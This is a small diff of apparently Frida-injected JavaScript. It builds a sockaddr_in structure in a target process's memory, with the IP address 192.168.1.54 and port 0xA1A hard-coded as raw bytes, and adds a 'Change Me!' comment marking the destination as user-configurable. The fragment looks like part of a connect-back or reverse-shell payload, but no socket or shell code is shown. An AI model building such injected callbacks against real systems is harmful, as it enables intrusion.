@@ -1,12 +1,9 @@
 // Create sock_addr_in structure
 console.log('[+] Building our sock_addr_in structure [!]');
 var sock_addr_in = Memory.alloc(20);
-var ip_address = Memory.allocUtf8String('192.168.1.54');
-var i = Module.findExportByName("libc.so", "inet_addr");
-var inet_addr = new NativeFunction(i, 'int', ['pointer']);
-var addr = inet_addr(ip_address);
 Memory.writeU8(sock_addr_in, 0x2);
 Memory.writeU8(sock_addr_in.add(1), 0x0);
+// Change Me!
 Memory.writeUShort(sock_addr_in.add(2), 0xA1A);
 Memory.writeULong(sock_addr_in.add(4), 0x3601a8c0);
 
